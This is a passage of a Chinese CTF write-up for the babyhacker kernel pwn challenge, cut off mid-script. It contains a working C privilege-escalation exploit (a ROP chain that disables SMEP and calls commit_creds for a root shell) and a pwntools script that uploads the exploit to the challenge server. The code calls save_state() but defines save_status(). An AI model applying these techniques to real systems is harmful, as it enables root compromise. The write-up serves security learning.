<!DOCTYPE html>
<html class="theme theme-white">
<head>
<meta charset="utf-8">
<title>20200307_gxzyctf</title>
<link href="https://www.zybuluo.com/static/assets/template-theme-white.css" rel="stylesheet" media="screen">
<style type="text/css">

#wmd-preview h1  {
    color: #0077bb; /* 将标题改为蓝色 */
}</style>
</head>
<body class="theme theme-white">
<div id="wmd-preview" class="wmd-preview wmd-preview-full-reader"><div class="md-section-divider"></div><div class="md-section-divider"></div><h1 data-anchor-id="heqj" id="20200307gxzyctf">20200307_gxzyctf</h1><p data-anchor-id="k2or"><code>pwn</code></p><hr><p data-anchor-id="ognk"><div class="toc">
<ul>
<li><a href="#20200307gxzyctf">20200307_gxzyctf</a><ul>
<li><a href="#babyhacker">babyhacker</a><ul>
<li><a href="#解题思路">解题思路</a></li>
<li><a href="#exp">exp</a></li>
<li><a href="#辅助">辅助</a><ul>
<li><a href="#调试便利">调试便利</a></li>
<li><a href="#cpio文件操作">cpio文件操作</a></li>
<li><a href="#获取gadget">获取gadget</a></li>
<li><a href="#上传提权程序的脚本">上传提权程序的脚本</a></li>
</ul>
</li>
<li><a href="#补充-启动脚本注入办法">补充 启动脚本注入办法</a></li>
</ul>
</li>
<li><a href="#kernob">kernob</a><ul>
<li><a href="#解题思路1">解题思路1</a></li>
<li><a href="#解题思路2">解题思路2</a></li>
<li><a href="#exp-1">exp</a></li>
<li><a href="#附加知识">附加知识</a><ul>
<li><a href="#编译选项-configslabfreelisthardened">编译选项 CONFIG_SLAB_FREELIST_HARDENED</a></li>
<li><a href="#编译选项-configslabfreelistrandom">编译选项 CONFIG_SLAB_FREELIST_RANDOM</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#easyheap">easyheap</a><ul>
<li><a href="#解题思路-1">解题思路</a></li>
<li><a href="#exp-2">exp</a></li>
</ul>
</li>
<li><a href="#woodenbox">woodenbox</a><ul>
<li><a href="#解题思路-2">解题思路</a></li>
<li><a href="#exp-3">exp</a></li>
<li><a href="#补充-topchunk-和-freehook-利用">补充 top_chunk 和 free_hook 利用</a></li>
</ul>
</li>
<li><a href="#shortestpath">Shortest_path</a><ul>
<li><a href="#解题思路-3">解题思路</a></li>
<li><a href="#exp-4">exp</a></li>
</ul>
</li>
<li><a href="#twochunk">twochunk</a><ul>
<li><a href="#解题思路-4">解题思路</a></li>
<li><a href="#exp-5">exp</a></li>
<li><a href="#补充">补充</a></li>
</ul>
</li>
<li><a href="#easyvm">easyvm</a><ul>
<li><a href="#解题思路-5">解题思路</a></li>
<li><a href="#exp-6">exp</a></li>
<li><a href="#补充-1">补充</a></li>
</ul>
</li>
<li><a href="#getflag">getflag</a><ul>
<li><a href="#exp-7">exp</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</p><div class="md-section-divider"></div><h2 data-anchor-id="1peo" id="babyhacker">babyhacker</h2><div class="md-section-divider"></div><h3 data-anchor-id="wgjl" id="解题思路">解题思路</h3><p data-anchor-id="s8lz">本题驱动开了<code>NX</code>和<code>canary</code>保护，漏洞在于传递数据的<code>unsigned __int16</code>属性的<code>buffersize</code>，所以赋值时的<code>signed __int</code>判断可以被负数绕过。</p><p data-anchor-id="elh5">先获得<code>canary</code>的值，然后把<code>rop</code>链传递过去，由于开了<code>kaslr</code>保护，但同时可以获取<code>proc/kallsyms</code>里的函数地址，通过<code>ROPgadet</code>获取由<code>bzImage</code>解压出来的<code>vmlinux</code>中的<code>gadget</code>，提权成功。</p><p data-anchor-id="7vol">一开始保存的寄存器状态有可能有问题，由于链接时间较短，使用<code>zip</code>压缩完后再上传解压</p><div class="md-section-divider"></div><h3 data-anchor-id="0h5k" id="exp">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="jhea"><ol class="linenums"><li class="L0"><code class="language-C"><span class="com">#define</span><span class="pln"> _GNU_SOURCE</span></code></li><li class="L1"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdio.h&gt;</span></code></li><li class="L2"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;stdlib.h&gt;</span></code></li><li class="L3"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;unistd.h&gt;</span></code></li><li class="L4"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/ioctl.h&gt;</span></code></li><li class="L5"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;string.h&gt;</span></code></li><li class="L6"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/types.h&gt;</span></code></li><li class="L7"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;fcntl.h&gt;</span></code></li><li class="L8"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;sys/mman.h&gt;</span></code></li><li class="L9"><code class="language-C"><span class="com">#include</span><span class="pln"> </span><span class="str">&lt;string.h&gt;</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="com">#define</span><span class="pln"> MMAP_BASE </span><span class="lit">0x2000000</span></code></li><li class="L2"><code class="language-C"><span class="com">#define</span><span class="pln"> MMAP_SIZE </span><span class="lit">0x100000</span></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"><span class="kwd">void</span><span class="pln"> get_shell</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L5"><code class="language-C"><span class="pln">    system</span><span class="pun">(</span><span class="str">"/bin/sh"</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pun">}</span></code></li><li class="L7"><code class="language-C"></code></li><li class="L8"><code class="language-C"><span class="typ">size_t</span><span class="pln"> vmlinux_base </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="typ">size_t</span><span class="pln"> raw_vmlinux_base </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff81000000</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> commit_creds </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> prepare_kernel_cred </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="kwd">void</span><span class="pln"> get_root</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="kwd">char</span><span class="pun">*</span><span class="pln"> </span><span class="pun">(*</span><span class="pln">pkc</span><span class="pun">)(</span><span class="kwd">int</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> prepare_kernel_cred</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">(*</span><span class="pln">cc</span><span class="pun">)(</span><span class="kwd">char</span><span class="pun">*)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> commit_creds</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="pun">(*</span><span class="pln">cc</span><span class="pun">)((*</span><span class="pln">pkc</span><span class="pun">)(</span><span class="lit">0</span><span class="pun">));</span></code></li><li class="L7"><code class="language-C"><span class="pun">}</span></code></li><li class="L8"><code class="language-C"></code></li><li class="L9"><code class="language-C"><span class="typ">size_t</span><span class="pln"> user_cs</span><span class="pun">,</span><span class="pln"> user_ss</span><span class="pun">,</span><span class="pln"> user_rflags</span><span class="pun">,</span><span class="pln"> user_sp</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="kwd">void</span><span class="pln"> save_status</span><span class="pun">()</span></code></li><li class="L1"><code class="language-C"><span class="pun">{</span></code></li><li class="L2"><code class="language-C"><span class="pln">    __asm__</span><span class="pun">(</span></code></li><li class="L3"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%cs, %0;"</span></code></li><li class="L4"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%ss, %1;"</span></code></li><li class="L5"><code class="language-C"><span class="pln">        </span><span class="str">"movq %%rsp,%2;"</span></code></li><li class="L6"><code class="language-C"><span class="pln">        </span><span class="str">"pushfq;"</span></code></li><li class="L7"><code class="language-C"><span class="pln">        </span><span class="str">"popq %3;"</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="pun">:</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_cs</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_ss</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_sp</span><span class="pun">),</span><span class="str">"=r"</span><span class="pun">(</span><span class="pln">user_rflags</span><span class="pun">)</span></code></li><li class="L9"><code class="language-C"><span class="pln">        </span><span class="pun">:</span></code></li><li class="L0"><code class="language-C"><span class="pln">        </span><span class="pun">:</span><span class="str">"memory"</span></code></li><li class="L1"><code class="language-C"><span class="pln">        </span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"><span class="pln">    puts</span><span class="pun">(</span><span class="str">"[*]status has been saved."</span><span class="pun">);</span></code></li><li class="L3"><code class="language-C"><span class="pun">}</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="com">#define</span><span class="pln"> GETSIZE </span><span class="lit">0x30000</span></code></li><li class="L7"><code class="language-C"><span class="com">#define</span><span class="pln"> KFU </span><span class="lit">0x30001</span></code></li><li class="L8"><code class="language-C"><span class="com">#define</span><span class="pln"> KTU </span><span class="lit">0x30002</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> get_symbol</span><span class="pun">(</span><span class="kwd">char</span><span class="pln"> </span><span class="pun">*</span><span class="pln">name</span><span class="pun">)</span></code></li><li class="L1"><code class="language-C"><span class="pun">{</span></code></li><li class="L2"><code class="language-C"><span class="pln">    FILE </span><span class="pun">*</span><span class="pln">f</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> addr</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="kwd">char</span><span class="pln"> dummy</span><span class="pun">,</span><span class="pln"> sym</span><span class="pun">[</span><span class="lit">512</span><span class="pun">];</span></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> ret </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="pln">    f </span><span class="pun">=</span><span class="pln"> fopen</span><span class="pun">(</span><span class="str">"/proc/kallsyms"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"r"</span><span class="pun">);</span></code></li><li class="L8"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">f</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L9"><code class="language-C"><span class="pln">        </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L1"><code class="language-C"></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="kwd">while</span><span class="pln"> </span><span class="pun">(</span><span class="pln">ret </span><span class="pun">!=</span><span class="pln"> EOF</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L3"><code class="language-C"><span class="pln">        ret </span><span class="pun">=</span><span class="pln"> fscanf</span><span class="pun">(</span><span class="pln">f</span><span class="pun">,</span><span class="pln"> </span><span class="str">"%p %c %s\n"</span><span class="pun">,</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">**)</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">addr</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">dummy</span><span class="pun">,</span><span class="pln"> sym</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">ret </span><span class="pun">==</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L5"><code class="language-C"><span class="pln">            fscanf</span><span class="pun">(</span><span class="pln">f</span><span class="pun">,</span><span class="pln"> </span><span class="str">"%s\n"</span><span class="pun">,</span><span class="pln"> sym</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"><span class="pln">            </span><span class="kwd">continue</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">        </span><span class="pun">}</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">strcmp</span><span class="pun">(</span><span class="pln">name</span><span class="pun">,</span><span class="pln"> sym</span><span class="pun">))</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L9"><code class="language-C"><span class="pln">            fclose</span><span class="pun">(</span><span class="pln">f</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"><span class="pln">            </span><span class="kwd">return</span><span class="pln"> addr</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">        </span><span class="pun">}</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L3"><code class="language-C"><span class="pln">    fclose</span><span class="pun">(</span><span class="pln">f</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"><span class="pun">}</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="kwd">int</span><span class="pln"> main</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L8"><code class="language-C"><span class="pln">    save_state</span><span class="pun">();</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> fd </span><span class="pun">=</span><span class="pln"> open</span><span class="pun">(</span><span class="str">"/dev/babyhacker"</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L1"><code class="language-C"></code></li><li class="L2"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> GETSIZE</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0xffffffff</span><span class="pun">);</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">buf </span><span class="pun">=</span><span class="pln"> mmap</span><span class="pun">(</span><span class="pln">NULL</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x10000</span><span class="pun">,</span><span class="pln"> </span><span class="lit">7</span><span class="pun">,</span><span class="pln"> MAP_PRIVATE </span><span class="pun">|</span><span class="pln"> MAP_ANONYMOUS</span><span class="pun">,</span><span class="pln"> </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pln">    printf</span><span class="pun">(</span><span class="str">"buf: %p\n"</span><span class="pun">,</span><span class="pln"> buf</span><span class="pun">);</span></code></li><li class="L5"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> KTU</span><span class="pun">,</span><span class="pln"> buf</span><span class="pun">);</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="pln">    commit_creds </span><span class="pun">=</span><span class="pln"> get_symbol</span><span class="pun">(</span><span class="str">"commit_creds"</span><span class="pun">);</span></code></li><li class="L8"><code class="language-C"><span class="pln">    prepare_kernel_cred </span><span class="pun">=</span><span class="pln"> get_symbol</span><span class="pun">(</span><span class="str">"prepare_kernel_cred"</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pln">    vmlinux_base </span><span class="pun">=</span><span class="pln"> commit_creds </span><span class="pun">-</span><span class="pln"> </span><span class="lit">0xa1430</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> offset </span><span class="pun">=</span><span class="pln"> vmlinux_base </span><span class="pun">-</span><span class="pln"> raw_vmlinux_base</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*</span><span class="pln">us_stack </span><span class="pun">=</span><span class="pln"> mmap</span><span class="pun">((</span><span class="kwd">void</span><span class="pun">*)</span><span class="pln">MMAP_BASE</span><span class="pun">,</span><span class="pln"> MMAP_SIZE</span><span class="pun">,</span><span class="pln"> PROT_READ </span><span class="pun">|</span><span class="pln"> PROT_WRITE</span><span class="pun">,</span><span class="pln"> MAP_PRIVATE </span><span class="pun">|</span><span class="pln"> MAP_ANON </span><span class="pun">|</span><span class="pln"> MAP_FIXED</span><span class="pun">,</span><span class="pln"> </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln">  rop</span><span class="pun">[</span><span class="lit">0x100</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="lit">0</span><span class="pun">};</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">int</span><span class="pln"> i </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff8109054d</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> offset</span><span class="pun">;</span><span class="pln"> </span><span class="com">// pop rdi; ret</span></code></li><li class="L8"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x6f0</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff81004d70</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> offset</span><span class="pun">;</span><span class="pln"> </span><span class="com">//mov cr4, rdi ; pop rbp ; ret</span></code></li><li class="L0"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> user_sp</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="pln">get_root</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff810636b4</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> offset</span><span class="pun">;</span><span class="pln"> </span><span class="com">// swapgs; pop rbp; ret</span></code></li><li class="L3"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> user_sp</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0xffffffff814712fe</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> offset</span><span class="pun">;</span><span class="pln"> </span><span class="com">// iretq; </span></code></li><li class="L5"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)</span><span class="pln">get_shell</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> user_cs</span><span class="pun">;</span></code></li><li class="L7"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> user_rflags</span><span class="pun">;</span></code></li><li class="L8"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pun">)(</span><span class="pln">us_stack</span><span class="pun">+</span><span class="lit">6000</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pln">    rop</span><span class="pun">[</span><span class="pln">i</span><span class="pun">++]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> user_ss</span><span class="pun">;</span></code></li><li class="L0"><code class="language-C"></code></li><li class="L1"><code class="language-C"><span class="pln">    memcpy</span><span class="pun">((</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">long</span><span class="pln"> </span><span class="pun">*)(</span><span class="pln">buf</span><span class="pun">+</span><span class="lit">0x150</span><span class="pun">),</span><span class="pln"> rop</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">sizeof</span><span class="pun">(</span><span class="pln">rop</span><span class="pun">));</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    ioctl</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">,</span><span class="pln"> KFU</span><span class="pun">,</span><span class="pln"> buf</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L6"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><div class="md-section-divider"></div><h3 data-anchor-id="ni14" id="辅助">辅助</h3><div class="md-section-divider"></div><h4 data-anchor-id="a0tp" id="调试便利">调试便利</h4><p data-anchor-id="c8au">使用 pwngdb 调试内核性能极差，用原生的 gdb</p><pre data-anchor-id="wic8"><code>add-symbol-file xxx.ko textaddr(/proc/modules 的对应地址)
set disassembly-flavor intel
</code></pre><p data-anchor-id="g0uq">修改启动文件，可能是<code>init</code>，也可能在<code>etc/</code>中，可以使启动的进程是<code>root</code>权限</p><pre data-anchor-id="2l4i"><code># setsid /bin/cttyhack setuidgid 1000 /bin/sh
setsid /bin/cttyhack setuidgid 0 /bin/sh
</code></pre><div class="md-section-divider"></div><h4 data-anchor-id="e9rj" id="cpio文件操作">cpio文件操作</h4><p data-anchor-id="5owy">解压</p><pre data-anchor-id="wr9o"><code>mkdir core
cd core/
cpio -idm &lt; ../initramfs.cpio
</code></pre><p data-anchor-id="adz3">恢复 </p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="96zv"><ol class="linenums"><li class="L0"><code class="language-sh"><span class="pln">gcc home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">exp</span><span class="pun">.</span><span class="pln">c </span><span class="pun">-</span><span class="pln">o home</span><span class="pun">/</span><span class="pln">pwn</span><span class="pun">/</span><span class="pln">exp </span><span class="pun">-</span><span class="pln">static</span></code></li><li class="L1"><code class="language-sh"><span class="pln">find </span><span class="pun">.</span><span class="pln"> </span><span class="pun">|</span><span class="pln"> cpio </span><span class="pun">-</span><span class="pln">o </span><span class="pun">--</span><span class="pln">format</span><span class="pun">=</span><span class="pln">newc </span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">../</span><span class="pln">initramfs</span><span class="pun">.</span><span class="pln">cpio</span></code></li></ol></pre><div class="md-section-divider"></div><h4 data-anchor-id="rv32" id="获取gadget">获取gadget</h4><pre data-anchor-id="f2fd"><code>./extract-vmlinux bzImage &gt; vmlinux
ROPgadget --binary vmlinux &gt; gadget
cat gadget
</code></pre><div class="md-section-divider"></div><h4 data-anchor-id="skb4" id="上传提权程序的脚本">上传提权程序的脚本</h4><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="hixl"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">import</span><span class="pln"> os</span></code></li><li class="L1"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="pln">HOST </span><span class="pun">=</span><span class="pln"> </span><span class="str">'121.36.215.224'</span></code></li><li class="L4"><code class="language-py"><span class="pln">PORT </span><span class="pun">=</span><span class="pln"> </span><span class="lit">9001</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">r </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">HOST </span><span class="pun">,</span><span class="pln"> PORT</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="com">#r = ssh(USER, HOST, PORT, PW)</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="kwd">def</span><span class="pln"> gen_bin</span><span class="pun">():</span></code></li><li class="L0"><code class="language-py"><span class="pln">    log</span><span class="pun">.</span><span class="pln">info</span><span class="pun">(</span><span class="str">'[+] Compiling'</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    os</span><span class="pun">.</span><span class="pln">system</span><span class="pun">(</span><span class="str">'gcc -static -o3 exp.c -o pwn'</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    </span><span class="com">#os.system('zip pwn.zip pwn')</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="kwd">def</span><span class="pln"> exec_cmd</span><span class="pun">(</span><span class="pln">cmd</span><span class="pun">):</span></code></li><li class="L5"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="pln">cmd</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">    r</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'$ '</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> upload</span><span class="pun">(</span><span class="pln">r</span><span class="pun">):</span></code></li><li class="L9"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> log</span><span class="pun">.</span><span class="pln">progress</span><span class="pun">(</span><span class="str">'[+] Uploading'</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="pln">    </span><span class="kwd">with</span><span class="pln"> open</span><span class="pun">(</span><span class="str">'pwn'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'rb'</span><span class="pun">)</span><span class="pln"> </span><span class="kwd">as</span><span class="pln"> f</span><span class="pun">:</span></code></li><li class="L2"><code class="language-py"><span class="pln">        data </span><span class="pun">=</span><span class="pln"> f</span><span class="pun">.</span><span class="pln">read</span><span class="pun">()</span></code></li><li class="L3"><code class="language-py"><span class="pln">    encoded </span><span class="pun">=</span><span class="pln"> base64</span><span class="pun">.</span><span class="pln">b64encode</span><span class="pun">(</span><span class="pln">data</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">encoded</span><span class="pun">),</span><span class="pln"> </span><span class="lit">300</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">        p</span><span class="pun">.</span><span class="pln">status</span><span class="pun">(</span><span class="str">'%d / %d'</span><span class="pln"> </span><span class="pun">%</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i</span><span class="pun">,</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">encoded</span><span class="pun">)))</span></code></li><li class="L7"><code class="language-py"><span class="pln">        exec_cmd</span><span class="pun">(</span><span class="str">'echo \"%s\" &gt;&gt; pwn_enc'</span><span class="pln"> </span><span class="pun">%</span><span class="pln"> </span><span class="pun">(</span><span class="pln">encoded</span><span class="pun">[</span><span class="pln">i</span><span class="pun">:</span><span class="pln">i</span><span class="pun">+</span><span class="lit">300</span><span class="pun">]))</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="pln">    